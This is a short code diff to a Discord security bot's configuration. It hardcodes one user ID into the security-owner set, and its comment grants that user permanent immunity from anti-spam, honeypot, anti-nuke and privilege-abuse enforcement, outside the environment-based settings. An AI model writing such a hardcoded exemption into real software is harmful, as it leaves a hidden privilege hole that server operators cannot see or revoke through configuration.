@@ -21,13 +21,18 @@ function number(value, fallback) {
   return Number.isFinite(parsed) ? parsed : fallback;
 }
 
+const securityOwners = ids(process.env.SECURITY_OWNER_IDS);
+// Permanent immunity: Chicken. Security treats this user the same as a security owner,
+// so anti-spam, honeypot, anti-nuke containment and privilege-abuse enforcement ignore them.
+securityOwners.add('1137081101341433936');
+
 const config = {
   discord: {
     guildId: process.env.GUILD_ID || '',
   },
 
-  // Guild owner is always authorized even when this list is empty.
-  securityOwners: ids(process.env.SECURITY_OWNER_IDS),
+  // Guild owner and permanent immune users are always authorized.
+  securityOwners,
   initialTrustedUsers: ids(process.env.TRUSTED_USER_IDS),
   initialTrustedRoles: ids(process.env.TRUSTED_ROLE_IDS),
 
